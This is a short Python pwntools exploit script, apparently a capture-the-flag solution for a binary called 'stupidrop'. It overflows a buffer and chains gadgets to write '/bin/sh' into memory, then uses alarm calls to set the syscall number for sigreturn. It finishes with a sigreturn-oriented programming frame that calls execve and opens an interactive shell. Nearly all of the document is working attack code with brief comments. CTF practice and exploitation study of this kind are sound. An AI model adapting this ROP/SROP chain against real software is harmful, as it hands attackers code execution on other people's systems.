#!/usr/bin/python 
from pwn import *

context.arch = "amd64"
s = process("./stupidrop")
elf = ELF("./stupidrop")

frame = SigreturnFrame()

bin_sh = 0x0000000000601200
syscall = 0x40063e
pop_rdi_ret = 0x00000000004006a3
gets = elf.sym["gets"]
alarm = elf.sym["alarm"]

# SigreturnFrame to call execve("/bin/sh", NULL, NULL)
frame.rip = syscall
frame.rax = 0x3b            # syscall number for execve
frame.rdi = bin_sh
frame.rsi = 0x0
frame.rdx = 0x0 

# Write /bin/sh into memory
payload = "A"*0x38
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(gets)

# alarm will return how many seconds left till alarm. Calling a second alarm will terminate the first and thus the first alarm will return 0xf (stored in rax).
payload += p64(pop_rdi_ret)
payload += p64(0xf)
payload += p64(alarm)
payload += p64(pop_rdi_ret)
payload += p64(0x0)
payload += p64(alarm)

# SROP attack
payload += p64(syscall)
payload += str(frame)

s.sendline(payload)
s.sendline("/bin/sh")       # for gets
s.interactive()
